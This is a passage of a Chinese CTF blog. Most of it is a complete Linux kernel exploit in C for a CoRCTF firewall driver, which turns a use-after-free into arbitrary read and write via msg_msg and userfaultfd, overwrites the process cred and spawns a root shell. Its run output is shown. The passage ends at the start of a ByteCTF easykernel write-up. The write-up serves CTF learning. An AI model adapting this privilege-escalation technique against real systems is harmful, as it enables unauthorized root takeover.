class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        msg_header fake_msg_header;</span><br><span class="line">        fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">        fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">        fake_msg_header.m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x8</span>;</span><br><span class="line">        fake_msg_header.next=target_addr;</span><br><span class="line">        fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">1</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%d.%d.%d\n&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,user_rule-&gt;idx);</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,<span class="keyword">user_rule_t</span>-&gt;idx);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;edit fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msg_id,size;</span><br><span class="line">    msg *msg_buff;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> init_ipc_ns=<span class="number">0</span>,kernel_base=<span class="number">0</span>,init_task=<span class="number">0</span>,init_cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> pid;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev, curr;</span><br><span class="line"></span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open dev/firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg_buff=(msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size=<span class="number">0x1000</span>;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    msg_id=make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;(msg_buff-&gt;mtext),<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    send_msg(msg_id, msg_buff, <span class="number">0x1010</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> shmid;</span><br><span class="line">        <span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get kernel_base_addr...\n&quot;</span>);</span><br><span class="line">    size=<span class="number">0x1500</span>;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((re_buf[i]&amp;<span class="number">0xfff</span>)==<span class="number">0x7a0</span>)&#123;</span><br><span class="line">            init_ipc_ns=re_buf[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = init_ipc_ns - <span class="number">0xc3d7a0</span>;</span><br><span class="line">    init_task = kernel_base + <span class="number">0xc124c0</span>;</span><br><span class="line">    init_cred = kernel_base + <span class="number">0xc33060</span>;</span><br><span class="line">    init_cred_addr=init_cred;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_ipc_ns: %p\n&quot;</span>, init_ipc_ns);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_task: %p\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_cred: %p\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)&amp;fake_msg_header,<span class="number">0</span>,<span class="keyword">sizeof</span>(msg_header));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] search this process task_struct\n&quot;</span>);</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    fake_msg_header.next=(<span class="keyword">void</span> *)init_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        curr=prev<span class="number">-0x298</span>;</span><br><span class="line">        fake_msg_header.next=prev<span class="number">-0x8</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get this process task_struct:%p\n&quot;</span>,curr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now write for cred\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf=mmap(<span class="number">0x200000</span>,<span class="number">0x2000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!buf)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_buff=<span class="number">0x200000</span>+<span class="number">0x1000</span><span class="number">-0x8</span>;</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    target_addr=curr + <span class="number">0x538</span> - <span class="number">0x8</span>;</span><br><span class="line">    size=<span class="number">0x1010</span>;</span><br><span class="line">    registerUserFaultFd(<span class="number">0x200000</span>+<span class="number">0x1000</span>,<span class="number">0x1000</span>,fault_handler_thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    send_msg(msg_id, msg_buff, size - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    pthread_join(monitor_thread,<span class="literal">NULL</span>);</span><br><span class="line">    usr_shell();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/exp$ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">ctf@CoRCTF:/exp$ /myexp</span><br><span class="line">idx:0</span><br><span class="line">[*] get kernel_base_addr...</span><br><span class="line">[+] init_ipc_ns: 0xffffffffa603d7a0</span><br><span class="line">[+] kernel_base: 0xffffffffa5400000</span><br><span class="line">[+] init_task: 0xffffffffa60124c0</span><br><span class="line">[+] init_cred: 0xffffffffa6033060</span><br><span class="line">[*] search this process task_struct</span><br><span class="line">0 86</span><br><span class="line">86 86</span><br><span class="line">[*] get this process task_struct:0xffff8d5c46128040</span><br><span class="line">[*] now write for cred</span><br><span class="line">idx:1</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell ok</span><br><span class="line">root@CoRCTF:/exp# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习到了在拥有了<code>4kb</code>的uaf情况下如何使用<code>msg</code>进行任意地址读和任意地址写的手段，还对<code>task_struct</code>进行了直观的了解，当然<code>msg</code>不仅能用于<code>4kb</code>情况下的<code>uaf</code>,它的功能非常强大。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">bytectf easykernel 复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-30 19:47:01 / 修改时间：19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="bytectf-easykernel-复现"><a href="#bytectf-easykernel-复现" class="headerlink" title="bytectf easykernel 复现"></a>bytectf easykernel 复现</h1><p>学长出的题，在比赛中由于没有接触过内核socket和arm指令集，然后再加上ida反汇编出来的代码非常抽象，看不清楚逻辑，所以直到比赛结束都没有找见洞在哪里，菜的离谱🤦‍♀️。只能在赛后复现复现这样子了。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>赛后就向学长要到了源码，看源码的时候发现了一个这个漏洞，可以溢出写，但是管道每次申请到的堆块的偏移不是固定的，所以不好利用，当时没注意到pop的时候不会清除标志位，经过学长提示才注意到，那从这个角度就好利用多了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span 